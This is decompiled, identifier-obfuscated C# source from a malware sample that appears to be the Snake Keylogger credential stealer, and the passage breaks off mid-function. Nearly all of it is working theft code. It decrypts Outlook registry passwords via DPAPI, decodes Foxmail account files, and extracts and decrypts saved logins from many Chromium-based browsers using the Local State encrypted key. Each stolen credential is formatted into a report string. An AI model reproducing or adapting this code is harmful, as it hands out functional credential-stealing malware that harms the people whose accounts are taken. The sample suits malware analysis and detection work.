// Decompiled with JetBrains decompiler
// Type: �ޗ�թζ.ک�鈟ٷΩ
// Assembly: iJMJnUDAnLMGBkvrphkwZ, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BCFE5CC-61DE-4CD2-8DAF-2FBF230839CD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-5067186ee6f83892e2d9e56ec500c4a4eb78c83006033b7f4ea166072624c87e.exe

using \uDA2C\uDC77ׁ\u060C\uFFFD;
using \uFFFDޗ\uFFFDթζ;
using ƉBŔ\u005E\u00AB;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Xml;
using ε\uFFFDœK\uFFFD;

namespace \uFFFDޗ\uFFFDթζ
{
  [StandardModule]
  internal sealed class ک\uFFFD鈟ٷΩ
  {
    private static byte[] і\u0097盀\uFFFDε = new byte[11]
    {
      (byte) 131,
      (byte) 125,
      (byte) 252,
      (byte) 15,
      (byte) 142,
      (byte) 179,
      (byte) 232,
      (byte) 105,
      (byte) 115,
      (byte) 175,
      byte.MaxValue
    };
    private static byte[] 뜸jW\u07FBĂ = new byte[4]
    {
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 8
    };
    private static string OЮ\uDB77\uDDCFΠ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    public static string ŧ\u02E8ήҡƚ;
    private static string Ѕôɩ\uFFFDٚ;
    public static string \u06DAԜéۨƉ = "";
    public static int Ȩņ\uFFFDşW = 0;
    public static int ήϘԌՄO = 0;

    public static void \u0657\uFFFDɢ\u060C\u07B4()
    {
      List<ک\uFFFD鈟ٷΩ.RecoveredApplicationAccount> applicationAccountList1 = new List<ک\uFFFD鈟ٷΩ.RecoveredApplicationAccount>();
      List<ک\uFFFD鈟ٷΩ.RecoveredApplicationAccount> applicationAccountList2 = ک\uFFFD鈟ٷΩ.\uFFFDɇɮ\u2964\uFFFD();
      if (applicationAccountList2.Count <= 0)
        return;
      try
      {
        foreach (ک\uFFFD鈟ٷΩ.RecoveredApplicationAccount applicationAccount in applicationAccountList2)
        {
          string str = "\r\n-------- Snake Keylogger --------\r\nFound From: Outlook\r\nURL: " + applicationAccount.URL + "\r\nE-Mail: " + applicationAccount.UserName + "\r\nPSWD: " + applicationAccount.Password + "\r\n---------------------------------\r\n ";
          \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str;
        }
      }
      finally
      {
        List<ک\uFFFD鈟ٷΩ.RecoveredApplicationAccount>.Enumerator enumerator;
        enumerator.Dispose();
      }
    }

    internal static List<ک\uFFFD鈟ٷΩ.RecoveredApplicationAccount> \uFFFDɇɮ\u2964\uFFFD()
    {
      List<ک\uFFFD鈟ٷΩ.RecoveredApplicationAccount> collection = new List<ک\uFFFD鈟ٷΩ.RecoveredApplicationAccount>();
      string[] strArray1 = new string[4]
      {
        "IMAP Password",
        "POP3 Password",
        "HTTP Password",
        "SMTP Password"
      };
      string str = (string) null;
      RegistryKey[] registryKeyArray = new RegistryKey[4]
      {
        Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676"),
        Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676"),
        Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"),
        Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676")
      };
      int index1 = 0;
      while (index1 < registryKeyArray.Length)
      {
        RegistryKey registryKey1 = registryKeyArray[index1];
        if (registryKey1 != null)
        {
          string[] subKeyNames = registryKey1.GetSubKeyNames();
          int index2 = 0;
          while (index2 < subKeyNames.Length)
          {
            string name1 = subKeyNames[index2];
            using (RegistryKey registryKey2 = registryKey1.OpenSubKey(name1))
            {
              UTF8Encoding Instance = new UTF8Encoding();
              if (registryKey2.GetValue("Email") != null & (registryKey2.GetValue("IMAP Password") != null | registryKey2.GetValue("POP3 Password") != null | registryKey2.GetValue("HTTP Password") != null | registryKey2.GetValue("SMTP Password") != null))
              {
                string[] strArray2 = strArray1;
                int index3 = 0;
                while (index3 < strArray2.Length)
                {
                  string name2 = strArray2[index3];
                  if (registryKey2.GetValue(name2) != null)
                    str = ک\uFFFD鈟ٷΩ.Ң߂ɮ늻Ī((byte[]) registryKey2.GetValue(name2));
                  checked { ++index3; }
                }
                object objectValue1 = RuntimeHelpers.GetObjectValue(registryKey2.GetValue("Email"));
                byte[] bytes1;
                try
                {
                  object[] objArray;
                  bool[] flagArray;
                  object obj = NewLateBinding.LateGet((object) Instance, (Type) null, "GetBytes", objArray = new object[1]
                  {
                    objectValue1
                  }, (string[]) null, (Type[]) null, flagArray = new bool[1]
                  {
                    true
                  });
                  if (flagArray[0])
                    objectValue1 = RuntimeHelpers.GetObjectValue(objArray[0]);
                  bytes1 = (byte[]) obj;
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  bytes1 = (byte[]) objectValue1;
                  ProjectData.ClearProjectError();
                }
                object objectValue2 = RuntimeHelpers.GetObjectValue(registryKey2.GetValue("SMTP Server"));
                byte[] bytes2;
                if (objectValue2 != null)
                {
                  try
                  {
                    object[] objArray;
                    bool[] flagArray;
                    object obj = NewLateBinding.LateGet((object) Instance, (Type) null, "GetBytes", objArray = new object[1]
                    {
                      objectValue2
                    }, (string[]) null, (Type[]) null, flagArray = new bool[1]
                    {
                      true
                    });
                    if (flagArray[0])
                      objectValue2 = RuntimeHelpers.GetObjectValue(objArray[0]);
                    bytes2 = (byte[]) obj;
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    bytes2 = (byte[]) objectValue2;
                    ProjectData.ClearProjectError();
                  }
                }
                else
                  bytes2 = Instance.GetBytes("Nothing");
                collection.Add(new ک\uFFFD鈟ٷΩ.RecoveredApplicationAccount()
                {
                  URL = Instance.GetString(bytes2).Replace("\0", ""),
                  UserName = Instance.GetString(bytes1).ToString().Replace(Conversions.ToString(Convert.ToChar(0)), ""),
                  Password = str.Replace(Conversions.ToString(Convert.ToChar(0)), ""),
                  appName = "Outlook"
                });
              }
            }
            checked { ++index2; }
          }
        }
        checked { ++index1; }
      }
      return new List<ک\uFFFD鈟ٷΩ.RecoveredApplicationAccount>((IEnumerable<ک\uFFFD鈟ٷΩ.RecoveredApplicationAccount>) collection);
    }

    public static string Ң߂ɮ늻Ī(byte[] _param0)
    {
      byte[] numArray = new byte[checked (_param0.Length - 2 + 1)];
      Buffer.BlockCopy((Array) _param0, 1, (Array) numArray, 0, checked (_param0.Length - 1));
      return Encoding.UTF8.GetString(ProtectedData.Unprotect(numArray, (byte[]) null, DataProtectionScope.CurrentUser)).Replace(Conversions.ToString(Convert.ToChar(0)), "");
    }

    public static void 嵱̧Юٗ\u07FB()
    {
      try
      {
        string str1 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Classes\\Foxmail.url.mailto\\Shell\\open\\command").GetValue("").ToString();
        string[] directories = Directory.GetDirectories(str1.Remove(str1.LastIndexOf("Foxmail.exe")).Replace("\"", "") + "Storage\\");
        int index1 = 0;
        while (index1 < directories.Length)
        {
          string path = directories[index1];
          DirectoryInfo directoryInfo = new DirectoryInfo(path);
          string Left1 = path.Substring(checked (path.LastIndexOf("\\") + 1));
          FileStream fileStream = new FileStream(path + "\\Accounts\\Account.rec0", FileMode.Open);
          int length = checked ((int) fileStream.Length);
          byte[] array = new byte[checked (length - 1 + 1)];
          bool flag = false;
          string str2 = "";
          fileStream.Read(array, 0, length);
          int num1 = array[0] != (byte) 208 ? 1 : 0;
          int num2 = checked (length - 1);
          int index2 = 0;
          while (index2 <= num2)
          {
            if (array[index2] > (byte) 32 && array[index2] < (byte) 127 && array[index2] != (byte) 61)
            {
              string str3 = str2;
              char ch = Strings.ChrW((int) array[index2]);
              str2 = str3 + ch.ToString();
              string str4 = "";
              if (str2.Equals("Account") || str2.Equals("POP3Account"))
              {
                int index3 = checked (index2 + 9);
                if (num1 == 0)
                  index3 = checked (index2 + 2);
                while (array[index3] > (byte) 32 && array[index3] < (byte) 127)
                {
                  string str5 = str4;
                  ch = Strings.ChrW((int) array[index3]);
                  str4 = str5 + ch.ToString();
                  checked { ++index3; }
                }
                flag = true;
                index2 = index3;
              }
              else if (flag && (str2.Equals("Password") || str2.Equals("POP3Password")))
              {
                int index4 = checked (index2 + 9);
                if (num1 == 0)
                  index4 = checked (index2 + 2);
                string Left2 = "";
                while (array[index4] > (byte) 32 && array[index4] < (byte) 127)
                {
                  string str6 = Left2;
                  ch = Strings.ChrW((int) array[index4]);
                  Left2 = str6 + ch.ToString();
                  checked { ++index4; }
                }
                if (!(Operators.CompareString(Left1, "", false) == 0 & Operators.CompareString(Left2, "", false) == 0))
                {
                  string str7 = Left2.Replace("!", "");
                  string str8 = "\r\n-------- Snake Keylogger --------\r\nFound From: Foxmail\r\n" + string.Format("E-Mail: {0}", (object) Left1) + "\r\n" + string.Format("PSWD: {0}", (object) ک\uFFFD鈟ٷΩ.\u05B5콪հ嵱Ԝ(num1, str7)) + "\r\n---------------------------------\r\n ";
                  \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str8;
                  break;
                }
                break;
              }
            }
            else
              str2 = "";
            checked { ++index2; }
          }
          fileStream.Close();
          checked { ++index1; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string \u05B5콪հ嵱Ԝ(int _param0, string _param1)
    {
      string str = "";
      int[] sourceArray1 = new int[8]
      {
        126,
        100,
        114,
        97,
        71,
        111,
        110,
        126
      };
      int[] numArray1 = new int[8]
      {
        126,
        70,
        64,
        55,
        37,
        109,
        36,
        126
      };
      int int32 = Convert.ToInt32("5A", 16);
      if (_param0 == 1)
      {
        sourceArray1 = numArray1;
        int32 = Convert.ToInt32("71", 16);
      }
      int num1 = checked ((int) Math.Round(unchecked ((double) _param1.Length / 2.0)));
      int startIndex = 0;
      int[] sourceArray2 = new int[checked (num1 - 1 + 1)];
      int num2 = checked (num1 - 1);
      int index1 = 0;
      while (index1 <= num2)
      {
        sourceArray2[index1] = Convert.ToInt32(_param1.Substring(startIndex, 2), 16);
        checked { startIndex += 2; }
        checked { ++index1; }
      }
      int[] destinationArray1 = new int[checked (sourceArray2.Length - 1 + 1)];
      destinationArray1[0] = sourceArray2[0] ^ int32;
      Array.Copy((Array) sourceArray2, 1, (Array) destinationArray1, 1, checked (sourceArray2.Length - 1));
      int[] destinationArray2;
      for (; sourceArray2.Length > sourceArray1.Length; sourceArray1 = destinationArray2)
      {
        destinationArray2 = new int[checked (sourceArray1.Length * 2 - 1 + 1)];
        Array.Copy((Array) sourceArray1, 0, (Array) destinationArray2, 0, sourceArray1.Length);
        Array.Copy((Array) sourceArray1, 0, (Array) destinationArray2, sourceArray1.Length, sourceArray1.Length);
      }
      int[] numArray2 = new int[checked (sourceArray2.Length - 1 + 1)];
      int num3 = checked (sourceArray2.Length - 1);
      int index2 = 1;
      while (index2 <= num3)
      {
        numArray2[checked (index2 - 1)] = sourceArray2[index2] ^ sourceArray1[checked (index2 - 1)];
        checked { ++index2; }
      }
      int[] numArray3 = new int[checked (numArray2.Length - 1 + 1)];
      int num4 = checked (numArray2.Length - 1 - 1);
      int index3 = 0;
      while (index3 <= num4)
      {
        numArray3[index3] = checked (numArray2[index3] - destinationArray1[index3]) >= 0 ? checked (numArray2[index3] - destinationArray1[index3]) : checked (numArray2[index3] + (int) byte.MaxValue - destinationArray1[index3]);
        str += Strings.ChrW(numArray3[index3]).ToString();
        checked { ++index3; }
      }
      return str;
    }

    public static bool \uFFFD\uD9D8\uDF1A\u003Bܣ(string 丐뜸ٷ뫆콪) => Operators.CompareString(丐뜸ٷ뫆콪.Substring(0, 3), "v10", false) == 0;

    public static byte[] 뜸\uFFFD̆ٚˤ(string 콪Ӥ뫆åޤ)
    {
      string path = 콪Ӥ뫆åޤ + "\\Local State";
      byte[] sourceArray = new byte[0];
      byte[] numArray1;
      if (!File.Exists(path))
      {
        numArray1 = (byte[]) null;
      }
      else
      {
        MatchCollection matchCollection = new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(path));
        try
        {
          foreach (object obj in matchCollection)
          {
            Match objectValue = (Match) RuntimeHelpers.GetObjectValue(obj);
            if (objectValue.Success)
              sourceArray = Convert.FromBase64String(objectValue.Groups[1].Value);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        byte[] numArray2 = new byte[checked (sourceArray.Length - 5 - 1 + 1)];
        Array.Copy((Array) sourceArray, 5, (Array) numArray2, 0, checked (sourceArray.Length - 5));
        try
        {
          numArray1 = ProtectedData.Unprotect(numArray2, (byte[]) null, DataProtectionScope.CurrentUser);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Console.WriteLine(ex.ToString());
          numArray1 = (byte[]) null;
          ProjectData.ClearProjectError();
        }
      }
      return numArray1;
    }

    public static string Ȩޗ\uFFFDzƜ(byte[] ƜkɢȨ恁, byte[] _param1)
    {
      byte[] destinationArray1 = new byte[12];
      Array.Copy((Array) ƜkɢȨ恁, 3, (Array) destinationArray1, 0, 12);
      string str;
      try
      {
        byte[] numArray = new byte[checked (ƜkɢȨ恁.Length - 15 - 1 + 1)];
        Array.Copy((Array) ƜkɢȨ恁, 15, (Array) numArray, 0, checked (ƜkɢȨ恁.Length - 15));
        byte[] destinationArray2 = new byte[16];
        byte[] destinationArray3 = new byte[checked (numArray.Length - destinationArray2.Length - 1 + 1)];
        Array.Copy((Array) numArray, checked (numArray.Length - 16), (Array) destinationArray2, 0, 16);
        Array.Copy((Array) numArray, 0, (Array) destinationArray3, 0, checked (numArray.Length - destinationArray2.Length));
        str = Encoding.UTF8.GetString(new Ł\uFFFD\u003Bג꾯().ŧzӛ\u0026Α(_param1, destinationArray1, (byte[]) null, destinationArray3, destinationArray2));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Console.WriteLine(ex.ToString());
        str = (string) null;
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static void ʤ\uFFFDW皍쐬()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Kinza\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Kinza\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void 뜸\uFFFDϘε\uFFFD()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Sputnik\\Sputnik\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Sputnik\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void 뫆\uFFFD\uFFFDK\uF0B9()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Sputnik\\Sputnik\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Falkon\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Ă\uFFFD\uFFFD똛ʤ()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\SalamWeb\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: SalamWeb\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void 늻̔ױ똛\u07FB()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\MapleStudio\\ChromePlus\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: CoolNovo\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void 丐Ԍ\u02E8չ鈇()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\QIP Surf\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: QIP Surf\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void 꾯\uFFFDˤŚʓ()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BlackHawk\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Black Hawk\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0327盀jē\uFFFD()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\7Star\\7Star\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
